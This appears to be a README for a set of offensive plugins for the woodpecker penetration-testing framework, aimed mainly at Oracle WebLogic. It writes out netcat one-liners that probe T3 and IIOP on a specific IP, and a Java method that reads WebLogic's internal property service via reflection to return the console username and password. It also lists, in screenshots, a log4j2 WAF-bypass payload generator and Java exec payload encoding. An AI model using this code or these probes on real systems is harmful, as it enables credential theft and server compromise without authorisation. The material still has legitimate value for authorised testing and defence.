# woodpecker-plugins usage

将插件复制到 `woodpecker-framwork/plugin` 目录下面，启动 `java -jar woodpecker-framework.1.3.3.jar`

from https://github.com/woodpecker-appstore


## weblogic-info

![image](https://user-images.githubusercontent.com/16593068/145928804-98d80f46-49cf-4282-b6c1-7d2572c9555b.png)

check T3 isOpen:

```
echo 't3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'|nc 10.20.31.189 7001
```

check IIOP isOpen:
```
echo "GIOP\x01\x02\x00\x03\x00\x00\x00\x17\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x0bNameService"| nc 10.20.31.189 7001

```

## weblogic console weak password

![image](https://user-images.githubusercontent.com/16593068/145929061-cd30b52b-bd2d-4b15-9e0e-21c582e6ac5f.png)

https://twitter.com/jas502n/status/1467122190760177664?s=20

`Use T3 protocol Get weblogic console username, password`

![image](https://user-images.githubusercontent.com/16593068/145929721-69d82710-de98-4985-97de-f3a8519966d7.png)
![image](https://user-images.githubusercontent.com/16593068/145929735-4683ac8f-d928-47ef-a606-1b1c559222b1.png)
![image](https://user-images.githubusercontent.com/16593068/145929756-a68dbd70-d021-433a-a5d4-7a129ccb47a4.png)

```java

public static String getPass() {
        try {
            ClassLoader l = Thread.currentThread().getContextClassLoader();
            Class HttpDataTransferHandler = l.loadClass("weblogic.deploy.service.datatransferhandlers.HttpDataTransferHandler");
            Class ManagementService = l.loadClass("weblogic.management.provider.ManagementService");
            Class AuthenticatedSubject = l.loadClass("weblogic.security.acl.internal.AuthenticatedSubject");
            Class PropertyService = l.loadClass("weblogic.management.provider.PropertyService");
            Field f = HttpDataTransferHandler.getDeclaredField("KERNE_ID");
            f.setAccessible(true);
            Method mm = ManagementService.getMethod("getPropertyService", AuthenticatedSubject);
            mm.setAccessible(true);
            Object prop = mm.invoke((Object) null, f.get((Object) null));
            Method m1 = PropertyService.getMethod("getTimestamp1");
            Method m2 = PropertyService.getMethod("getTimestamp2");
            m1.setAccessible(true);
            m2.setAccessible(true);
            String name = (String) m1.invoke(prop);
            String pass = (String) m2.invoke(prop);
            return "name:" + name + ",pass:" + pass + ";";
        } catch (Exception var12) {
            return var12.toString();
        }
    }

```

## springBoot api Scan

![image](https://user-images.githubusercontent.com/16593068/145928893-ed8fd0bd-4833-4d93-af98-25e807414e8d.png)

## log4j2 bypass waf payload generate 

![image](https://user-images.githubusercontent.com/16593068/145928965-37db4f8f-36f4-4a2d-9fc1-f5cf6077792d.png)

# class to BCEL Code

![image](https://user-images.githubusercontent.com/16593068/145929249-30d960b8-79e4-4e82-a488-42bda1edea7c.png)

![image](https://user-images.githubusercontent.com/16593068/145929232-64d8fba1-7471-4680-811e-424573314353.png)

# java Runtime EXEC Encode

![image](https://user-images.githubusercontent.com/16593068/145929372-83d91878-1b02-471f-9795-d8e2e13b98e9.png)

http://jackson-t.ca/runtime-exec-payloads.html

![image](https://user-images.githubusercontent.com/16593068/145929430-e6c284ed-873b-45ca-a6f3-e5844f9007bc.png)

